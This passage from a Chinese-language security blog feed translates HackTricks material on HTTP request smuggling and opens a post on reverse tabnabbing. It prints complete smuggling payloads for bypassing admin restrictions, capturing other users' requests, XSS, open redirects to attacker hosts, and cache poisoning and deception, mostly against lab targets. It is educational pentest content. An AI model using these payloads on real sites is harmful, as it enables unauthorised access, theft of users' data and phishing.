<h3 id="TE-TE"><a href="#TE-TE" class="headerlink" title="TE.TE"></a>TE.TE</h3><p>前端和后端都支持 <code>Transfer-Encoding</code> ，但是可以通过以某种方式混淆, 以此诱导其中一个服务器不处理它。<br>有无穷无尽的方法来混淆 <code>Transfer-Encoding</code> 头文件。例如:</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="attribute">Transfer-Encoding</span><span class="punctuation">: </span>xchunked</span><br><span class="line"></span><br><span class="line">Transfer-Encoding : chunked</span><br><span class="line"></span><br><span class="line"><span class="attribute">Transfer-Encoding</span><span class="punctuation">: </span>chunked</span><br><span class="line"><span class="attribute">Transfer-Encoding</span><span class="punctuation">: </span>x</span><br><span class="line"></span><br><span class="line">Transfer-Encoding:[tab]chunked</span><br><span class="line"></span><br><span class="line">[space]Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line"><span class="attribute">X</span><span class="punctuation">: </span>X[\n]Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">Transfer-Encoding</span><br><span class="line">: chunked</span><br></pre></td></tr></table></figure>

<p>明确被混淆之后 <code>Transfer-Encoding</code> 在反向代理还是后端服务器会不被处理，或许会得到一个 <code>CL.TE</code> 或 <code>TE.CL</code> 形式的 HTTP 请求走私漏洞。</p>
<h2 id="发现-HTTP-请求走私漏洞"><a href="#发现-HTTP-请求走私漏洞" class="headerlink" title="发现 HTTP 请求走私漏洞"></a>发现 HTTP 请求走私漏洞</h2><h3 id="基于时间的发现技术"><a href="#基于时间的发现技术" class="headerlink" title="基于时间的发现技术"></a>基于时间的发现技术</h3><h4 id="TE-CL-1"><a href="#TE-CL-1" class="headerlink" title="TE.CL"></a>TE.CL</h4><p>如果目标系统存在 <code>TE.CL</code> 形式的 HTTP 请求走私漏洞, 可通过以下请求包进行检测:</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>vulnerable-website.com</span><br><span class="line"><span class="attribute">Transfer-Encoding</span><span class="punctuation">: </span>chunked</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>keep-alive</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>6</span><br><span class="line"></span><br><span class="line"><span class="language-tp"><span class="number">0</span></span></span><br><span class="line"><span class="language-tp"></span></span><br><span class="line"><span class="language-tp"><span class="keyword">X</span></span></span><br></pre></td></tr></table></figure>

<p>这是因为前端使用 <code>Transfer-Encoding: chunked</code> , 所以会将上述请求视为两个请求, 从而忽略 <code>X</code> 继而将请求包转发到后端, 而后端使用 <code>Content-Length</code> , 且 <code>Content-Length = 6</code> 。后端通过数值了解到客户端希望发送大小为 6 字节的数据, 由于请求包数据主体大小不满足 6 字节, 所以会继续等待数据的到来, 这将引起明显的时间延迟现象。</p>
<h4 id="CL-TE-1"><a href="#CL-TE-1" class="headerlink" title="CL.TE"></a>CL.TE</h4><p>如果目标系统存在 <code>CL.TE</code> 形式的 HTTP 请求走私漏洞, 可通过以下请求包进行检测:</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>vulnerable-website.com</span><br><span class="line"><span class="attribute">Transfer-Encoding</span><span class="punctuation">: </span>chunked</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>keep-alive</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>6</span><br><span class="line"></span><br><span class="line"><span class="language-abnf"><span class="number">5</span></span></span><br><span class="line"><span class="language-abnf"><span class="attribute">X</span><span class="operator">=</span><span class="number">1</span></span></span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontents.com/sing3r/image/main/hexoImage20221127165908.png"></p>
<h3 id="基于-404-响应的技术"><a href="#基于-404-响应的技术" class="headerlink" title="基于 404 响应的技术"></a>基于 <code>404</code> 响应的技术</h3><p>基于时间的技术起了作用之后,我们可以尝试触发 404 响应确认漏洞真实性。并且通过该测试,探究如何影响其他请求,达成攻击利用。最简单的攻击利用就是使客户端的请求结果变为 <code>404</code> 响应。</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"># 通过 CL.TE 修改客户端的响应结果</span><br><span class="line"><span class="keyword">POST</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>vulnerable-website.com</span><br><span class="line"><span class="attribute">Transfer-Encoding</span><span class="punctuation">: </span>chunked</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>keep-alive</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>31</span><br><span class="line"></span><br><span class="line"><span class="language-apache"><span class="attribute">0</span></span></span><br><span class="line"><span class="language-apache"></span></span><br><span class="line"><span class="language-apache"><span class="attribute">GET</span> /<span class="number">404</span> HTTP/<span class="number">1</span>.<span class="number">1</span></span></span><br><span class="line"><span class="language-apache"><span class="attribute">Foox</span>: x</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>注意,勿需写 <code>Host</code> 头,因为下一个请求会携带 <code>Host</code> 头,如添加可能会报请求头重复错误。</p>
</blockquote>
<p><img src="https://raw.githubusercontents.com/sing3r/image/main/hexoImage20221127200856.png" alt=" 404 投毒"></p>
<p><img src="https://raw.githubusercontents.com/sing3r/image/main/hexoImage20221127200927.png" alt="攻击结果"></p>
<h4 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项:"></a>注意事项:</h4><p>当试图通过干扰其他请求来确认请求走私漏洞时，应该记住一些重要的注意事项:</p>
<ul>
<li>“攻击”请求和“正常”请求应该通过不同的网络连接发送到服务器,通过同一个连接发送两个请求并不能证明漏洞的存在。</li>
<li>“攻击”请求和“正常”请求应该尽可能使用相同的URL和参数名。这是因为许多现代应用程序根据 URL 和参数将前端请求路由到不同的后端服务器。使用相同的 URL 和参数增加了请求由相同的后端服务器处理的机会。</li>
<li>当测试“正常”请求以检测来自“攻击”请求的任何干扰时，将与其他用户的请求进行竞争。应该在“攻击”请求之后立即发送“正常”请求。如果应用程序繁忙，您可能需要执行多次尝试来确认漏洞。</li>
<li>在某些应用中，前端服务器作为负载均衡器，根据某种负载均衡算法将请求转发到不同的后端系统。如果“攻击”和“正常”请求被转发到不同的后端系统，那么攻击将会失败。这也是您可能需要多次尝试才能确认漏洞的另一个原因。</li>
<li>如果您的攻击成功干扰了后续的请求，但这不是您为检测干扰而发送的“正常”请求，那么这意味着另一个应用程序用户受到了您的攻击的影响。如果您继续执行测试，这可能会对其他用户产生破坏性影响，您应该谨慎操作。</li>
</ul>
<h3 id="使用-hop-by-hop-攻击探测-HTTP-请求走私攻击"><a href="#使用-hop-by-hop-攻击探测-HTTP-请求走私攻击" class="headerlink" title="使用 hop-by-hop 攻击探测 HTTP 请求走私攻击"></a>使用 hop-by-hop 攻击探测 HTTP 请求走私攻击</h3><p>通过 <code>hop-by-hop</code> 攻击 ，可以指示前端代理删除 <code>Content-Length</code> 或<code>Transfer-Encoding</code>，这样可能会导致系统出现 HTTP 请求走私漏洞。</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>Content-Lentgh</span><br><span class="line">OR</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>Transfer-Encoding</span><br></pre></td></tr></table></figure>

<h2 id="关于-HTTP-请求走私漏洞的攻击利用"><a href="#关于-HTTP-请求走私漏洞的攻击利用" class="headerlink" title="关于 HTTP 请求走私漏洞的攻击利用"></a>关于 HTTP 请求走私漏洞的攻击利用</h2><h3 id="绕过前端安全控制"><a href="#绕过前端安全控制" class="headerlink" title="绕过前端安全控制"></a>绕过前端安全控制</h3><p>有时,前端将执行一些安全检查。通过 HTTP 请求走私漏洞可绕过前端保护。例如,前端限制访问 <code>/admin</code>,通过请求走私绕过前端检查:</p>
<ul>
<li><p><strong>CL.TE</strong></p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>acb21fdd1f98c4f180c02944000100b5.web-security-academy.net</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>session=xht3rUYoc83NfuZkuAp8sDxzf0AZIwQr</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>keep-alive</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>67</span><br><span class="line"><span class="attribute">Transfer-Encoding</span><span class="punctuation">: </span>chunked</span><br><span class="line"></span><br><span class="line"><span class="language-apache"><span class="attribute">0</span></span></span><br><span class="line"><span class="language-apache"></span></span><br><span class="line"><span class="language-apache"><span class="attribute">GET</span> /admin HTTP/<span class="number">1</span>.<span class="number">1</span></span></span><br><span class="line"><span class="language-apache"><span class="attribute">Host</span>: localhost</span></span><br><span class="line"><span class="language-apache"><span class="attribute">Content</span>-Length: <span class="number">10</span></span></span><br><span class="line"><span class="language-apache"></span></span><br><span class="line"><span class="language-apache"><span class="attribute">x</span>=</span></span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>TE.CL</strong></p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>ace71f491f52696180f41ed100d000d4.web-security-academy.net</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>session=Dpll5XYw4hNEu09dGccoTjHlFNx5QY1c</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>keep-alive</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>4</span><br><span class="line"><span class="attribute">Transfer-Encoding</span><span class="punctuation">: </span>chunked</span><br><span class="line"></span><br><span class="line"><span class="language-routeros">2b</span></span><br><span class="line"><span class="language-routeros"><span class="built_in">GET</span> /admin HTTP/1.1</span></span><br><span class="line"><span class="language-routeros">Host: localhost</span></span><br><span class="line"><span class="language-routeros"></span></span><br><span class="line"><span class="language-routeros"><span class="attribute">a</span>=x</span></span><br><span class="line"><span class="language-routeros">0</span></span><br><span class="line"><span class="language-routeros"></span></span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="获取前端添加内容"><a href="#获取前端添加内容" class="headerlink" title="获取前端添加内容"></a>获取前端添加内容</h3><p>有时候,前端服务器会在转发请求到后端服务器之前执行一些请求重写操作，通常是添加一些请求头。<br>常见为添加 <code>X-Forwarded-For: &lt;客户端 IP&gt;</code> ，以便后端知道客户端的真实 IP 地址。有时，如果能获取前端添加的请求头信息，可能会有助于绕过保护并访问隐藏的接口或资源。<br>为了解前端如何重写请求，可以找到一个 POST 请求,且该请求的参数内容会在响应结果中反映。将该参数放置到最后，发送一个如下形式的请求:</p>
<ul>
<li><strong>CL.TE</strong><figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>vulnerable-website.com</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>137</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>keep-alive</span><br><span class="line"><span class="attribute">Transfer-Encoding</span><span class="punctuation">: </span>chunked</span><br><span class="line"></span><br><span class="line"><span class="language-stata">0</span></span><br><span class="line"><span class="language-stata"></span></span><br><span class="line"><span class="language-stata"><span class="keyword">POST</span> /<span class="keyword">search</span> HTTP/1.1</span></span><br><span class="line"><span class="language-stata">Host: vulnerable-website.com</span></span><br><span class="line"><span class="language-stata">Content-<span class="keyword">Type</span>: application/x-www-<span class="keyword">form</span>-urlencoded</span></span><br><span class="line"><span class="language-stata">Content-Length: 100</span></span><br><span class="line"><span class="language-stata"></span></span><br><span class="line"><span class="language-stata"><span class="keyword">search</span>=</span></span><br></pre></td></tr></table></figure></li>
<li><strong>TE.CL</strong><figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>vulnerable-website.com</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>4</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>keep-alive</span><br><span class="line"><span class="attribute">Transfer-Encoding</span><span class="punctuation">: </span>chunked</span><br><span class="line"></span><br><span class="line"><span class="language-stata">84</span></span><br><span class="line"><span class="language-stata"><span class="keyword">POST</span> /<span class="keyword">search</span> HTTP/1.1</span></span><br><span class="line"><span class="language-stata">Host: vulnerable-website.com</span></span><br><span class="line"><span class="language-stata">Content-<span class="keyword">Type</span>: application/x-www-<span class="keyword">form</span>-urlencoded</span></span><br><span class="line"><span class="language-stata">Content-Length: 100</span></span><br><span class="line"><span class="language-stata"></span></span><br><span class="line"><span class="language-stata"><span class="keyword">search</span>=</span></span><br><span class="line"><span class="language-stata">0</span></span><br><span class="line"><span class="language-stata"></span></span><br></pre></td></tr></table></figure></li>
</ul>
<p>测试过程中需注意走私请求的 <code>Content-Length</code> 数值,过小则不能完全获取请求信息,过大则会抛出错误。</p>
<h3 id="捕获用户请求"><a href="#捕获用户请求" class="headerlink" title="捕获用户请求"></a>捕获用户请求</h3><p>假设目标存在请求走私漏洞,且存在一个 POST 请求接口，该接口保存其中一个参数的内容。发送以下请求将可存储下一个客户端的请求:</p>
<ul>
<li><p><strong>CL.TE</strong></p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>ac031feb1eca352f8012bbe900fa00a1.web-security-academy.net</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>314</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>keep-alive</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>session=4X6SWQeR8KiOPZPF2Gpca2IKeA1v4KYi</span><br><span class="line"><span class="attribute">Transfer-Encoding</span><span class="punctuation">: </span>chunked</span><br><span class="line"></span><br><span class="line"><span class="language-dts"><span class="number">0</span></span></span><br><span class="line"><span class="language-dts">POST <span class="keyword">/post/</span>comment HTTP/<span class="number">1.1</span></span></span><br><span class="line"><span class="language-dts"><span class="symbol">Host:</span> ac031feb1eca352f8012bbe900fa00a1.web-security-academy.net</span></span><br><span class="line"><span class="language-dts">Content-Length: <span class="number">659</span></span></span><br><span class="line"><span class="language-dts">Content-Type: application/x-www-form-urlencoded</span></span><br><span class="line"><span class="language-dts"><span class="symbol">Cookie:</span> <span class="attr">session</span><span class="operator">=</span><span class="number">4</span>X6SWQeR8KiOPZPF2Gpca2IKeA1v4KYi</span></span><br><span class="line"><span class="language-dts"></span></span><br><span class="line"><span class="language-dts"><span class="attr">csrf</span><span class="operator">=</span>gpGAVAbj7pKq7VfFh45CAICeFCnancCM<span class="variable">&amp;</span>postId=<span class="number">4</span><span class="variable">&amp;name</span>=HACKTRICKS<span class="variable">&amp;email</span>=email%<span class="number">40</span>email.com<span class="variable">&amp;comment</span>=</span></span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>TE.CL</strong></p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>ac031feb1eca352f8012bbe900fa00a1.web-security-academy.net</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>5</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>keep-alive</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>session=4X6SWQeR8KiOPZPF2Gpca2IKeA1v4KYi</span><br><span class="line"><span class="attribute">Transfer-Encoding</span><span class="punctuation">: </span>chunked</span><br><span class="line"></span><br><span class="line"><span class="language-dts"><span class="number">139</span></span></span><br><span class="line"><span class="language-dts">POST <span class="keyword">/post/</span>comment HTTP/<span class="number">1.1</span></span></span><br><span class="line"><span class="language-dts"><span class="symbol">Host:</span> ac031feb1eca352f8012bbe900fa00a1.web-security-academy.net</span></span><br><span class="line"><span class="language-dts">Content-Length: <span class="number">659</span></span></span><br><span class="line"><span class="language-dts">Content-Type: application/x-www-form-urlencoded</span></span><br><span class="line"><span class="language-dts"><span class="symbol">Cookie:</span> <span class="attr">session</span><span class="operator">=</span><span class="number">4</span>X6SWQeR8KiOPZPF2Gpca2IKeA1v4KYi</span></span><br><span class="line"><span class="language-dts"></span></span><br><span class="line"><span class="language-dts"><span class="attr">csrf</span><span class="operator">=</span>gpGAVAbj7pKq7VfFh45CAICeFCnancCM<span class="variable">&amp;</span>postId=<span class="number">4</span><span class="variable">&amp;name</span>=HACKTRICKS<span class="variable">&amp;email</span>=email%<span class="number">40</span>email.com<span class="variable">&amp;comment</span>=</span></span><br><span class="line"><span class="language-dts"><span class="number">0</span></span></span><br><span class="line"><span class="language-dts"></span></span><br></pre></td></tr></table></figure></li>
</ul>
<p>下一用户请求将成为走私请求的一部分,  用户请求信息被追加到 <code>&amp;comment=</code> 后面。由于 HTTP 参数以 <code>&amp;</code> 作为分隔符,所以追加的内容遇到 <code>&amp;</code> 之后将被终止,即只能捕获 <code>&amp;</code> 之前的数据。</p>
<h3 id="通过-HTTP-请求走私漏洞进行反射型-XSS-攻击"><a href="#通过-HTTP-请求走私漏洞进行反射型-XSS-攻击" class="headerlink" title="通过 HTTP 请求走私漏洞进行反射型 XSS 攻击"></a>通过 HTTP 请求走私漏洞进行反射型 XSS 攻击</h3><p><strong>优点:</strong></p>
<ul>
<li>勿需交互</li>
<li>能更够简单高效地触发 XSS 。例如 XSS 触发点在请求头中,真实情况下难以利用,通过 HTTP 请求走私漏洞则可快速利用。</li>
</ul>
<p><strong>CL.TE</strong></p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>ac311fa41f0aa1e880b0594d008d009e.web-security-academy.net</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0) Gecko/20100101 Firefox/75.0</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>session=Ro7YknOtbl3bxURHAAxZz84qj3PSMnSY</span><br><span class="line"><span class="attribute">Transfer-Encoding</span><span class="punctuation">: </span>chunked</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>keep-alive</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>213</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line"><span class="language-makefile">0</span></span><br><span class="line"><span class="language-makefile">GET /post?postId=2 HTTP/1.1</span></span><br><span class="line"><span class="language-makefile"><span class="section">Host: ac311fa41f0aa1e880b0594d008d009e.web-security-academy.net</span></span></span><br><span class="line"><span class="language-makefile"><span class="section">User-Agent: &quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;</span></span></span><br><span class="line"><span class="language-makefile"><span class="section">Content-Length: 10</span></span></span><br><span class="line"><span class="language-makefile"><span class="section">Content-Type: application/x-www-form-urlencoded</span></span></span><br><span class="line"><span class="language-makefile"></span></span><br><span class="line"><span class="language-makefile">A=</span></span><br></pre></td></tr></table></figure>
<h3 id="将-on-site-重定向转换为开放重定向"><a href="#将-on-site-重定向转换为开放重定向" class="headerlink" title="将 on-site 重定向转换为开放重定向"></a>将 on-site 重定向转换为开放重定向</h3><p>许多应用程序存在从一个 URL 到另一个 URL 的 on-site 重定向，并将来自请求的 <code>Host</code> 头的主机名引用到重定向URL中。一个例子是 <code>Apache</code> 和 <code>IIS</code> web 服务器的默认行为，其中对一个没有结尾斜杠的文件夹的请求会收到一个重定向到包含结尾斜杠的相同文件夹:</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/home</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>normal-website.com</span><br><span class="line">....</span><br><span class="line"></span><br><span class="line"><span class="language-http"><span class="meta">HTTP/1.1</span> <span class="number">301</span> Moved Permanently</span></span><br><span class="line"><span class="language-http"><span class="attribute">Location</span><span class="punctuation">: </span>https://normal-website.com/home/</span></span><br></pre></td></tr></table></figure>

<p>这种行为通常被认为是无害的，但它可以在请求走私攻击中被利用，将其他用户重定向到外部域。例如:</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>vulnerable-website.com</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>54</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>keep-alive</span><br><span class="line"><span class="attribute">Transfer-Encoding</span><span class="punctuation">: </span>chunked</span><br><span class="line"></span><br><span class="line"><span class="language-vbnet"><span class="number">0</span></span></span><br><span class="line"><span class="language-vbnet"><span class="keyword">GET</span> /home HTTP/<span class="number">1.1</span></span></span><br><span class="line"><span class="language-vbnet"><span class="symbol">Host:</span> attacker-website.com</span></span><br><span class="line"><span class="language-vbnet"><span class="symbol">Foo:</span> X</span></span><br></pre></td></tr></table></figure>

<h3 id="通过-HTTP-请求走私执行-WEB-缓存中毒攻击"><a href="#通过-HTTP-请求走私执行-WEB-缓存中毒攻击" class="headerlink" title="通过 HTTP 请求走私执行 WEB 缓存中毒攻击"></a>通过 HTTP 请求走私执行 WEB 缓存中毒攻击</h3><p>如果目标站点存在缓存中毒漏洞，可以通过 HTTP 请求走私方式投毒。通过走私 <code>404</code> 请求,使用户正常请求返回 <code>404</code>，负载均衡将存储 <code>404</code> 响应页面，从而对目标页面造成拒绝服务攻击。</p>
<p>如果目标存在开放重定向，或者 on-site 重定向。我们甚至可以改变某个 js 文件的内容，如 <code>/static/include.js</code> 的内容。从而导致所有加载 <code>/static/include.js</code> 的客户端均被攻击。如下代码所示：</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>vulnerable.net</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>keep-alive</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>124</span><br><span class="line"><span class="attribute">Transfer-Encoding</span><span class="punctuation">: </span>chunked</span><br><span class="line"></span><br><span class="line"><span class="language-routeros">0</span></span><br><span class="line"><span class="language-routeros"></span></span><br><span class="line"><span class="language-routeros"><span class="built_in">GET</span> /post/next?<span class="attribute">postId</span>=3 HTTP/1.1</span></span><br><span class="line"><span class="language-routeros">Host: attacker.net</span></span><br><span class="line"><span class="language-routeros">Content-Type: application/x-www-form-urlencoded</span></span><br><span class="line"><span class="language-routeros">Content-Length: 10</span></span><br><span class="line"><span class="language-routeros"></span></span><br><span class="line"><span class="language-routeros"><span class="attribute">x</span>=1</span></span><br></pre></td></tr></table></figure>
<p>假设对 <code>/post/next?postId=3</code> 的访问将会触发 on-site 重定向，服务器将引用请求包中的 <code>Host</code> 头作为重定向的目标域，重定向至 <code>/post?postId=4</code>。<br>上面的走私请求 Host 被设置为有攻击者控制的服务器 <code>attacker.net</code>。在毒化 socket 后，需要发送一个正常 GET 请求访问 **<code>/static/include.js</code>**。对于 <code>/static/include.js</code> 资源的访问，服务器将返回的却是 <code>/post/next?postId=3</code> 的响应，即 302 重定向响应 <code>Location：attacker.net/post?postId=4</code> ，并且该响应将被缓存服务器缓存。只要攻击者设置对于 <code>attacker.net/post?postId=4</code> 的请求，返回恶意 js 内容，那下次有人访问 <code>/static/include.js</code>,将会返回而已资源。</p>
<h3 id="使用HTTP请求走私来执行web缓存欺骗"><a href="#使用HTTP请求走私来执行web缓存欺骗" class="headerlink" title="使用HTTP请求走私来执行web缓存欺骗"></a>使用HTTP请求走私来执行web缓存欺骗</h3><p>当目标存在缓存中毒漏洞，可尝试通过以下代码执行 web 缓存欺骗。走私一个敏感信息获取请求包，当合法用户携带认证信息访问静态文件的时候，如 ：image.png，由于 socket 被毒化，服务器将返回 <code>/private/messages</code> 的内容。但缓存服务器识别到请求的是 <code>image.png</code>，所以返回内容将被缓存至缓存服务器，攻击者可以通过请求 <code>image.png</code>，获取合法用户的个人信息。</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>vulnerable-website.com</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>keep-alive</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>43</span><br><span class="line"><span class="attribute">Transfer-Encoding</span><span class="punctuation">: </span>chunked</span><br><span class="line"></span><br><span class="line"><span class="language-vbnet"><span class="number">0</span></span></span><br><span class="line"><span class="language-vbnet"></span></span><br><span class="line"><span class="language-vbnet"><span class="keyword">GET</span> /<span class="keyword">private</span>/messages HTTP/<span class="number">1.1</span></span></span><br><span class="line"><span class="language-vbnet"><span class="symbol">Foo:</span> X</span></span><br></pre></td></tr></table></figure>

<h3 id="备忘清单"><a href="#备忘清单" class="headerlink" title="备忘清单"></a>备忘清单</h3><p><img src="https://raw.githubusercontents.com/sing3r/image/main/hexoImage20221225151625.png"></p>
<h2 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h2><ul>
<li><a href="https://github.com/PortSwigger/http-request-smuggler">https://github.com/PortSwigger/http-request-smuggler</a></li>
<li><a href="https://github.com/gwen001/pentest-tools/blob/master/smuggler.py">https://github.com/gwen001/pentest-tools/blob/master/smuggler.py</a></li>
<li><a href="https://github.com/defparam/smuggler">https://github.com/defparam/smuggler</a></li>
<li><a href="https://github.com/bahruzjabiyev/t-reqs-http-fuzzer">https://github.com/bahruzjabiyev/t-reqs-http-fuzzer</a>: This tool is a grammar-based HTTP Fuzzer useful to find weird request smuggling discrepancies.</li>
</ul>
<h2 id="原文"><a href="#原文" class="headerlink" title="原文"></a>原文</h2><p><a href="https://book.hacktricks.xyz/pentesting-web/http-request-smuggling#weaponizing-http-request-smuggling-with-http-response-desynchronisation">https://book.hacktricks.xyz/pentesting-web/http-request-smuggling#weaponizing-http-request-smuggling-with-http-response-desynchronisation</a></p>
]]></content>
  </entry>
  <entry>
    <title>Reverse Tab Nabbing（反向标签劫持）</title>
    <url>/2022/04/17/Reverse-Tab-Nabbing%EF%BC%88%E5%8F%8D%E5%90%91%E6%A0%87%E7%AD%BE%E5%8A%AB%E6%8C%81%EF%BC%89/</url>
    <content><![CDATA[<h1 id="Reverse-Tab-Nabbing（反向标签劫持）"><a href="#Reverse-Tab-Nabbing（反向标签劫持）" class="headerlink" title="Reverse Tab Nabbing（反向标签劫持）"></a>Reverse Tab Nabbing（反向标签劫持）</h1><h2 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h2><p>当攻击者能够控制 A 页面中包含<code>target=&quot;_blank&quot; rel=&quot;opener&quot;</code>属性的 <code>&lt;a&gt;</code> 标签的 <code>href</code> 的值时，攻击者可以通过 <code>href</code> 属性将 <code>&lt;a&gt;</code> 标签指向 B 页面（恶意页面）。诱导受害者点击A页面的 <code>&lt;a&gt;</code> 标签后，浏览器将转跳至 B 页面（恶意页面），攻击者可以通过在B 页面（恶意页面）设置的 JavaScript 对象（window.opener），强制在原来 a 页面所在的窗口打开另一个页面 C。</p>
<p>即使 A 页面中的 <code>&lt;a&gt;</code> 标签属性中不包含 **<code>rel=&quot;opener&quot;</code>**，但包含 <strong><code>target=&quot;_blank&quot;</code></strong> 的情况下，上述技术也可能实现。前提是 <code>&lt;a&gt;</code> 标签中没有包含 <code>rel=&quot;noopener&quot;</code> 或 <code>rel=&quot;noreferrer&quot;</code>的属性，或者浏览器对 <code>&lt;a&gt;</code> 标签设置的默认属性值不为 <code>rel=&quot;noopener&quot;</code> 或 <code>rel=&quot;noreferrer&quot;</code>。</p>
<p>基于上述技术，攻击者可以通过在 B 页面（恶意页面）设置 <code>window.opener.location = https://attacker.com/victim.html</code> 。并且将 C 页面模仿成与原来的 A 页面一样，诱骗受害者输入账号密码进行钓鱼，或者执行其他 JavaScript 攻击。 </p>
<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><h3 id="With-back-link"><a href="#With-back-link" class="headerlink" title="With back link"></a>With back link</h3><p>不使用 <code>rel=&quot;noopener&quot;</code> 或 <code>rel=&quot;noreferrer&quot;</code> 属性时父页面和子页面之间的链接：</p>
